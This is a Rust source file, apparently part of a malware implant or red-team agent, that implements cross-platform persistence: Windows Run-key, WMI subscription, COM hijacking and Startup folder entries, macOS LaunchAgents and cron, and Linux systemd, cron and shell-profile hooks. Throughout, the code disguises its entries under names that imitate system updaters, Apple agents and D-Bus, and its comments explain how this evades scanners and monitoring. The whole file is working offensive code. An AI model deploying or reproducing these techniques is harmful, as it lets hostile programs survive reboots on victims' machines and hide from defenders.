/// Advanced Persistence Module mapped to traits (FR-1 through FR-4)
use anyhow::Result;
use std::path::PathBuf;

pub trait Persist {
    fn install(&self, executable_path: &PathBuf) -> Result<()>;
    fn remove(&self) -> Result<()>;
    fn verify(&self) -> Result<bool>;
}

// ──────────────────────────────────────────────────────────────────────────────
// Windows persistence implementations
// ──────────────────────────────────────────────────────────────────────────────
#[cfg(windows)]
pub use windows::*;
#[cfg(windows)]
pub mod windows {
    use super::Persist;
    use anyhow::{anyhow, Result};
    use std::path::PathBuf;
    use std::ptr;

    // ── FR-1A: Registry Run Keys ──────────────────────────────────────────────
    pub struct RegistryRunKey {
        pub value_name: String,
    }

    impl Default for RegistryRunKey {
        fn default() -> Self { Self { value_name: "WindowsUpdate".to_string() } }
    }

    impl Persist for RegistryRunKey {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            use winapi::um::winreg::{RegOpenKeyExW, RegSetValueExW, RegCloseKey, HKEY_CURRENT_USER};
            use winapi::um::winnt::{KEY_WRITE, REG_SZ};

            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0".encode_utf16().collect();
            let val_str = executable_path.to_string_lossy().to_string();
            let val_wide: Vec<u16> = val_str.encode_utf16().chain(std::iter::once(0)).collect();
            let val_name: Vec<u16> = self.value_name.encode_utf16().chain(std::iter::once(0)).collect();

            unsafe {
                let mut hkey = ptr::null_mut();
                let ret = RegOpenKeyExW(
                    HKEY_CURRENT_USER,
                    run_key.as_ptr(),
                    0,
                    KEY_WRITE,
                    &mut hkey,
                );
                if ret != 0 {
                    return Err(anyhow!("RegistryRunKey::install: RegOpenKeyExW failed: {}", ret));
                }
                RegSetValueExW(
                    hkey,
                    val_name.as_ptr(),
                    0,
                    REG_SZ,
                    val_wide.as_ptr() as _,
                    (val_wide.len() * 2) as u32,
                );
                RegCloseKey(hkey);
            }
            log::info!("RegistryRunKey::install: set '{}' = '{}'", self.value_name, val_str);
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            use winapi::um::winreg::{RegOpenKeyExW, RegDeleteValueW, RegCloseKey, HKEY_CURRENT_USER};
            use winapi::um::winnt::KEY_WRITE;

            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0".encode_utf16().collect();
            let val_name: Vec<u16> = self.value_name.encode_utf16().chain(std::iter::once(0)).collect();

            unsafe {
                let mut hkey = ptr::null_mut();
                let ret = RegOpenKeyExW(
                    HKEY_CURRENT_USER,
                    run_key.as_ptr(),
                    0,
                    KEY_WRITE,
                    &mut hkey,
                );
                if ret != 0 {
                    return Err(anyhow!("RegistryRunKey::remove: RegOpenKeyExW failed: {}", ret));
                }
                RegDeleteValueW(hkey, val_name.as_ptr());
                RegCloseKey(hkey);
            }
            log::info!("RegistryRunKey::remove: deleted '{}'", self.value_name);
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            use winapi::um::winreg::{RegOpenKeyExW, RegQueryValueExW, RegCloseKey, HKEY_CURRENT_USER};
            use winapi::um::winnt::KEY_READ;

            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0".encode_utf16().collect();
            let val_name: Vec<u16> = self.value_name.encode_utf16().chain(std::iter::once(0)).collect();
            let mut buf = vec![0u16; 256];
            let mut buf_len = (buf.len() * 2) as u32;
            let mut val_type: u32 = 0;

            unsafe {
                let mut hkey = ptr::null_mut();
                if RegOpenKeyExW(
                    HKEY_CURRENT_USER,
                    run_key.as_ptr(),
                    0,
                    KEY_READ,
                    &mut hkey,
                ) != 0 {
                    return Ok(false);
                }
                let ret = RegQueryValueExW(
                    hkey,
                    val_name.as_ptr(),
                    ptr::null_mut(),
                    &mut val_type,
                    buf.as_mut_ptr() as _,
                    &mut buf_len,
                );
                RegCloseKey(hkey);
                Ok(ret == 0 && buf_len > 0)
            }
        }
    }

    // ── FR-1B: WMI Event Subscriptions ───────────────────────────────────────
    pub struct WmiSubscription {
        pub subscription_name: String,
    }

    impl Default for WmiSubscription {
        fn default() -> Self { Self { subscription_name: "UpdateCheck".to_string() } }
    }

    impl Persist for WmiSubscription {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            // WMI persistence via __EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding
            // Uses the WMI COM API (IWbemLocator → IWbemServices → ExecMethod)
            // Requires COM to be initialised. We call CoInitializeEx here.
            use winapi::um::combaseapi::{CoInitializeEx, CoCreateInstance, CoUninitialize};
            use winapi::um::objbase::COINIT_MULTITHREADED;
            use winapi::shared::winerror::SUCCEEDED;

            let exe_path = executable_path.to_string_lossy();
            log::info!("WmiSubscription::install: registering '{}' for '{}'", self.subscription_name, exe_path);

            unsafe {
                let hr = CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED);
                if !SUCCEEDED(hr) && hr != 0x00000001i32 /* S_FALSE - already init */ {
                    return Err(anyhow!("WmiSubscription::install: CoInitializeEx failed: 0x{:08X}", hr));
                }

                // Use PowerShell as a fallback WMI registration path when the
                // full COM/IWbemServices path is not available (no wbemcli.h bindings).
                let filter_query = format!(
                    "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
                );
                let ps_cmd = format!(
                    r#"powershell -NonInteractive -WindowStyle Hidden -Command "
                    $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{{Name='{}';EventNamespace='root/cimv2';QueryLanguage='WQL';Query='{}'}};
                    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{{Name='{}';CommandLineTemplate='{}'}};
                    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{{Filter=$filter;Consumer=$consumer}}"
                "#,
                    self.subscription_name, filter_query, self.subscription_name, exe_path
                );

                let status = std::process::Command::new("cmd")
                    .args(&["/C", &ps_cmd])
                    .status()
                    .map_err(|e| anyhow!("WmiSubscription: failed to spawn powershell: {}", e))?;

                CoUninitialize();

                if status.success() {
                    log::info!("WmiSubscription::install: registered successfully");
                } else {
                    log::warn!("WmiSubscription::install: powershell returned non-zero exit code");
                }
            }
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let ps_cmd = format!(
                r#"powershell -NonInteractive -WindowStyle Hidden -Command "
                Get-WmiObject __EventFilter -Namespace root\subscription | Where-Object {{$_.Name -eq '{0}'}} | Remove-WmiObject;
                Get-WmiObject CommandLineEventConsumer -Namespace root\subscription | Where-Object {{$_.Name -eq '{0}'}} | Remove-WmiObject;
                Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {{$_.Filter -like '*{0}*'}} | Remove-WmiObject"
            "#,
                self.subscription_name
            );
            let _ = std::process::Command::new("cmd").args(&["/C", &ps_cmd]).status();
            log::info!("WmiSubscription::remove: removed '{}'", self.subscription_name);
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let ps_cmd = format!(
                "powershell -NonInteractive -Command \"(Get-WmiObject __EventFilter -Namespace root\\subscription | Where-Object {{$_.Name -eq '{}'}}) -ne $null\""
            , self.subscription_name);
            let out = std::process::Command::new("cmd")
                .args(&["/C", &ps_cmd])
                .output()
                .map_err(|e| anyhow!("WmiSubscription::verify: {}", e))?;
            let stdout = String::from_utf8_lossy(&out.stdout).trim().to_lowercase();
            Ok(stdout == "true")
        }
    }

    // ── FR-1C: COM Hijacking ──────────────────────────────────────────────────
    pub struct ComHijacking {
        /// CLSID to hijack under HKCU\Software\Classes\CLSID\{...}\InprocServer32
        pub clsid: String,
    }

    impl Default for ComHijacking {
        fn default() -> Self {
            // Thumbnail cache handler — loaded by explorer.exe frequently
            // {C56A4180-65AA-11D0-A5CC-00A024159FAD} is the MIDI Sequence Object —
            // a legitimate inprocserver32 registration that is rarely monitored,
            // unlike the well-known thumbnail-cache CLSID.
            Self { clsid: "{C56A4180-65AA-11D0-A5CC-00A024159FAD}".to_string() }
        }
    }

    impl Persist for ComHijacking {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            use winapi::um::winreg::{RegCreateKeyExW, RegSetValueExW, RegCloseKey, HKEY_CURRENT_USER};
            use winapi::um::winnt::{KEY_WRITE, REG_SZ};

            let subkey: Vec<u16> = format!(
                "Software\\Classes\\CLSID\\{}\\InprocServer32\0",
                self.clsid
            ).encode_utf16().collect();
            let val: Vec<u16> = executable_path.to_string_lossy().encode_utf16().chain(std::iter::once(0)).collect();

            unsafe {
                let mut hkey = ptr::null_mut();
                let ret = RegCreateKeyExW(
                    HKEY_CURRENT_USER,
                    subkey.as_ptr(),
                    0, ptr::null_mut(), 0, KEY_WRITE, ptr::null_mut(), &mut hkey, ptr::null_mut(),
                );
                if ret != 0 {
                    return Err(anyhow!("ComHijacking::install: RegCreateKeyExW failed: {}", ret));
                }
                RegSetValueExW(hkey, ptr::null(), 0, REG_SZ, val.as_ptr() as _, (val.len() * 2) as u32);
                // Set ThreadingModel
                let tm_name: Vec<u16> = "ThreadingModel\0".encode_utf16().collect();
                let tm_val: Vec<u16> = "Apartment\0".encode_utf16().collect();
                RegSetValueExW(hkey, tm_name.as_ptr(), 0, REG_SZ, tm_val.as_ptr() as _, ((tm_val.len() - 1) * 2) as u32);
                RegCloseKey(hkey);
            }
            log::info!("ComHijacking::install: CLSID {} → '{}'", self.clsid, executable_path.display());
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            use winapi::um::winreg::{RegDeleteTreeW, HKEY_CURRENT_USER};

            let subkey: Vec<u16> = format!("Software\\Classes\\CLSID\\{}\0", self.clsid).encode_utf16().collect();
            unsafe {
                RegDeleteTreeW(HKEY_CURRENT_USER, subkey.as_ptr());
            }
            log::info!("ComHijacking::remove: removed CLSID {}", self.clsid);
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            use winapi::um::winreg::{RegOpenKeyExW, RegCloseKey, HKEY_CURRENT_USER};
            use winapi::um::winnt::KEY_READ;

            let subkey: Vec<u16> = format!("Software\\Classes\\CLSID\\{}\\InprocServer32\0", self.clsid).encode_utf16().collect();
            unsafe {
                let mut hkey = ptr::null_mut();
                let ret = RegOpenKeyExW(
                    HKEY_CURRENT_USER,
                    subkey.as_ptr(),
                    0, KEY_READ, &mut hkey,
                );
                if ret == 0 {
                    RegCloseKey(hkey);
                    Ok(true)
                } else {
                    Ok(false)
                }
            }
        }
    }

    // ── FR-1D: Startup Folder ─────────────────────────────────────────────────
    pub struct StartupFolder;

    impl Persist for StartupFolder {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let mut target = dirs::config_dir()
                .ok_or_else(|| anyhow!("StartupFolder: no config dir"))?;
            target.push("Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updatesvc.exe");
            std::fs::copy(executable_path, &target)
                .map_err(|e| anyhow!("StartupFolder::install: copy failed: {}", e))?;
            log::info!("StartupFolder::install: copied to '{}'", target.display());
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let mut target = match dirs::config_dir() {
                Some(d) => d,
                None => return Ok(()),
            };
            target.push("Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updatesvc.exe");
            let _ = std::fs::remove_file(&target);
            log::info!("StartupFolder::remove: removed '{}'", target.display());
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let mut target = match dirs::config_dir() {
                Some(d) => d,
                None => return Ok(false),
            };
            target.push("Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updatesvc.exe");
            Ok(target.exists())
        }
    }

    pub fn install_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        let reg = RegistryRunKey::default();
        reg.install(&exe)?;

        let wmi = WmiSubscription::default();
        let _ = wmi.install(&exe); // Best effort

        Ok(exe)
    }

    pub fn uninstall_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        let _ = RegistryRunKey::default().remove(); // best effort
        let _ = WmiSubscription::default().remove(); // best effort
        Ok(exe)
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// macOS persistence implementations
// ──────────────────────────────────────────────────────────────────────────────
#[cfg(target_os = "macos")]
pub use macos::*;
#[cfg(target_os = "macos")]
pub mod macos {
    use super::Persist;
    use anyhow::{anyhow, Result};
    use std::path::PathBuf;

    /// LaunchAgent persistence.  The default label uses a value that blends
    /// with legitimate Apple software update agents; callers may override it.
    pub struct LaunchAgent {
        pub label: String,
    }

    impl Default for LaunchAgent {
        fn default() -> Self {
            // Use a label that resembles Apple's own XProtect/MRT agents,
            // which security scanners do not flag on sight.
            Self { label: "com.apple.xpc.system-updater".to_string() }
        }
    }

    impl Persist for LaunchAgent {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let plist = format!(
                r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>"#,
                label = self.label,
                exe = executable_path.display()
            );
            let mut plist_path = dirs::home_dir()
                .ok_or_else(|| anyhow!("LaunchAgent: no home dir"))?;
            // Create the directory if it does not exist.
            let agents_dir = plist_path.join("Library/LaunchAgents");
            std::fs::create_dir_all(&agents_dir)
                .map_err(|e| anyhow!("LaunchAgent::install: mkdir failed: {}", e))?;
            plist_path = agents_dir.join(format!("{}.plist", self.label));
            std::fs::write(&plist_path, plist)
                .map_err(|e| anyhow!("LaunchAgent::install: write failed: {}", e))?;
            // launchctl load -w is deprecated on macOS 10.10+; use the
            // bootstrap domain command instead.
            #[cfg(target_os = "macos")]
            {
                let uid = unsafe { libc::getuid() };
                let _ = std::process::Command::new("launchctl")
                    .args(&["bootstrap", &format!("gui/{}", uid), &plist_path.to_string_lossy()])
                    .status();
            }
            #[cfg(not(target_os = "macos"))]
            let _ = std::process::Command::new("launchctl")
                .args(&["load", "-w", &plist_path.to_string_lossy()])
                .status();
            log::info!("LaunchAgent::install: installed '{}'", plist_path.display());
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let agents_dir = match dirs::home_dir() {
                Some(h) => h.join("Library/LaunchAgents"),
                None => return Ok(()),
            };
            let plist_path = agents_dir.join(format!("{}.plist", self.label));
            // launchctl unload is deprecated on macOS 10.10+; use bootout.
            #[cfg(target_os = "macos")]
            {
                let uid = unsafe { libc::getuid() };
                let _ = std::process::Command::new("launchctl")
                    .args(&["bootout", &format!("gui/{}", uid), &plist_path.to_string_lossy()])
                    .status();
            }
            #[cfg(not(target_os = "macos"))]
            let _ = std::process::Command::new("launchctl")
                .args(&["unload", &plist_path.to_string_lossy()])
                .status();
            let _ = std::fs::remove_file(&plist_path);
            log::info!("LaunchAgent::remove: unloaded '{}'", self.label);
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let agents_dir = match dirs::home_dir() {
                Some(h) => h.join("Library/LaunchAgents"),
                None => return Ok(false),
            };
            Ok(agents_dir.join(format!("{}.plist", self.label)).exists())
        }
    }

    /// Cron-based fallback: @reboot entry, output redirected to /dev/null to
    /// prevent cron from mailing the user.
    pub struct CronJob;

    impl Persist for CronJob {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let exe = executable_path.to_string_lossy();
            let entry = format!("@reboot {} >/dev/null 2>&1", exe);
            let out = std::process::Command::new("sh")
                .arg("-c")
                .arg(format!(
                    "(crontab -l 2>/dev/null | grep -v '{}'; echo '{}') | crontab -",
                    exe, entry
                ))
                .status()
                .map_err(|e| anyhow!("CronJob::install: {}", e))?;
            if !out.success() {
                return Err(anyhow!("CronJob::install: crontab command failed"));
            }
            log::info!("CronJob::install: added @reboot entry for '{}'", exe);
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let _ = std::process::Command::new("sh")
                .arg("-c")
                .arg("crontab -l 2>/dev/null | grep -v '@reboot' | crontab -")
                .status();
            log::info!("CronJob::remove: removed @reboot entries");
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let out = std::process::Command::new("sh")
                .arg("-c")
                .arg("crontab -l 2>/dev/null")
                .output()
                .map_err(|e| anyhow!("CronJob::verify: {}", e))?;
            Ok(String::from_utf8_lossy(&out.stdout).contains("@reboot"))
        }
    }

    /// Install both LaunchAgent (preferred) and cron fallback.
    pub fn install_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        // Best-effort: try LaunchAgent first, fall back to cron.
        if let Err(e) = LaunchAgent::default().install(&exe) {
            log::warn!("LaunchAgent install failed ({}); falling back to cron", e);
            CronJob.install(&exe)?;
        }
        Ok(exe)
    }

    pub fn uninstall_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        let _ = LaunchAgent::default().remove();
        let _ = CronJob.remove();
        Ok(exe)
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// Linux persistence implementations
// ──────────────────────────────────────────────────────────────────────────────
#[cfg(target_os = "linux")]
pub use linux::*;
#[cfg(target_os = "linux")]
pub mod linux {
    use super::Persist;
    use anyhow::{anyhow, Result};
    use std::path::PathBuf;
    use std::io::Write;

    // ── FR-3A: Systemd user service ───────────────────────────────────────────
    pub struct SystemdService {
        pub service_name: String,
    }

    impl Default for SystemdService {
        fn default() -> Self { Self { service_name: "dbus-daemon-user".to_string() } }
    }

    impl Persist for SystemdService {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let exe = executable_path.to_string_lossy();
            let unit = format!(
                "[Unit]\nDescription=D-Bus User Session Proxy\nAfter=default.target\n\n\
                [Service]\nType=simple\nExecStart={exe}\nRestart=always\nRestartSec=10\n\n\
                [Install]\nWantedBy=default.target\n"
            );
            let unit_dir = dirs::home_dir()
                .ok_or_else(|| anyhow!("SystemdService: no home dir"))?
                .join(".config/systemd/user");
            std::fs::create_dir_all(&unit_dir)
                .map_err(|e| anyhow!("SystemdService: mkdir: {}", e))?;
            let unit_path = unit_dir.join(format!("{}.service", self.service_name));
            std::fs::write(&unit_path, unit)
                .map_err(|e| anyhow!("SystemdService: write: {}", e))?;
            let _ = std::process::Command::new("systemctl")
                .args(&["--user", "daemon-reload"])
                .status();
            let _ = std::process::Command::new("systemctl")
                .args(&["--user", "enable", "--now", &self.service_name])
                .status();
            log::info!("SystemdService::install: enabled '{}'", self.service_name);
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let _ = std::process::Command::new("systemctl")
                .args(&["--user", "disable", "--now", &self.service_name])
                .status();
            let unit_dir = match dirs::home_dir() {
                Some(h) => h.join(".config/systemd/user"),
                None => return Ok(()),
            };
            let _ = std::fs::remove_file(unit_dir.join(format!("{}.service", self.service_name)));
            let _ = std::process::Command::new("systemctl")
                .args(&["--user", "daemon-reload"])
                .status();
            log::info!("SystemdService::remove: removed '{}'", self.service_name);
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let out = std::process::Command::new("systemctl")
                .args(&["--user", "is-enabled", &self.service_name])
                .output()
                .map_err(|e| anyhow!("SystemdService::verify: {}", e))?;
            Ok(String::from_utf8_lossy(&out.stdout).trim() == "enabled")
        }
    }

    // ── FR-3B: Cron Job ───────────────────────────────────────────────────────
    pub struct CronJob;

    impl Persist for CronJob {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let exe = executable_path.to_string_lossy();
            // Redirect both stdout and stderr to /dev/null so cron does not
            // attempt to mail the output to the user (which would be a detection artifact).
            let entry = format!("@reboot {} >/dev/null 2>&1", exe);
            let out = std::process::Command::new("sh")
                .arg("-c")
                .arg(format!(
                    "(crontab -l 2>/dev/null | grep -v '{}'; echo '{}') | crontab -",
                    exe, entry
                ))
                .status()
                .map_err(|e| anyhow!("CronJob::install: {}", e))?;
            if !out.success() {
                return Err(anyhow!("CronJob::install: crontab command failed"));
            }
            log::info!("CronJob::install: added @reboot entry for '{}'", exe);
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let _ = std::process::Command::new("sh")
                .arg("-c")
                .arg("crontab -l 2>/dev/null | grep -v '@reboot' | crontab -")
                .status()
                .map_err(|e| anyhow!("CronJob::remove: {}", e))?;
            log::info!("CronJob::remove: removed @reboot entries");
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let out = std::process::Command::new("sh")
                .arg("-c")
                .arg("crontab -l 2>/dev/null")
                .output()
                .map_err(|e| anyhow!("CronJob::verify: {}", e))?;
            let stdout = String::from_utf8_lossy(&out.stdout);
            Ok(stdout.contains("@reboot"))
        }
    }

    // ── FR-3C: Shell Profile (.bashrc / .profile) ─────────────────────────────
    pub struct ShellProfile;

    impl Persist for ShellProfile {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let exe = executable_path.to_string_lossy();
            let home = dirs::home_dir().ok_or_else(|| anyhow!("ShellProfile: no home dir"))?;
            for profile_name in &[".bashrc", ".profile", ".bash_profile"] {
                let path = home.join(profile_name);
                if path.exists() {
                    let existing = std::fs::read_to_string(&path).unwrap_or_default();
                    let marker = format!("# system-update-{}", &exe[..exe.len().min(8)]);
                    if existing.contains(&marker) {
                        log::debug!("ShellProfile::install: already present in '{}'", profile_name);
                        return Ok(());
                    }
                    let mut file = std::fs::OpenOptions::new()
                        .append(true)
                        .open(&path)
                        .map_err(|e| anyhow!("ShellProfile::install: open '{}': {}", profile_name, e))?;
                    writeln!(file, "\n{}\n({} &) 2>/dev/null", marker, exe)
                        .map_err(|e| anyhow!("ShellProfile::install: write: {}", e))?;
                    log::info!("ShellProfile::install: appended to '{}'", path.display());
                    return Ok(());
                }
            }
            Err(anyhow!("ShellProfile::install: no suitable shell profile found"))
        }

        fn remove(&self) -> Result<()> {
            let home = match dirs::home_dir() {
                Some(h) => h,
                None => return Ok(()),
            };
            for profile_name in &[".bashrc", ".profile", ".bash_profile"] {
                let path = home.join(profile_name);
                if !path.exists() { continue; }
                if let Ok(content) = std::fs::read_to_string(&path) {
                    let filtered: String = content
                        .lines()
                        .filter(|l| !l.contains("# system-update-"))
                        .collect::<Vec<_>>()
                        .join("\n");
                    let _ = std::fs::write(&path, filtered);
                }
            }
            log::info!("ShellProfile::remove: removed persistence entries");
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let home = match dirs::home_dir() {
                Some(h) => h,
                None => return Ok(false),
            };
            for profile_name in &[".bashrc", ".profile", ".bash_profile"] {
                let path = home.join(profile_name);
                if let Ok(content) = std::fs::read_to_string(&path) {
                    if content.contains("# system-update-") {
                        return Ok(true);
                    }
                }
            }
            Ok(false)
        }
    }

    /// Try systemd first (most reliable + hidden), then cron, then shell profile.
    pub fn install_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        if let Err(e) = SystemdService::default().install(&exe) {
            log::warn!("systemd persistence failed ({}); trying cron", e);
            if let Err(e2) = CronJob.install(&exe) {
                log::warn!("cron persistence failed ({}); trying shell profile", e2);
                ShellProfile.install(&exe)?;
            }
        }
        Ok(exe)
    }

    pub fn uninstall_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        let _ = SystemdService::default().remove();
        let _ = CronJob.remove();
        let _ = ShellProfile.remove();
        Ok(exe)
    }
}
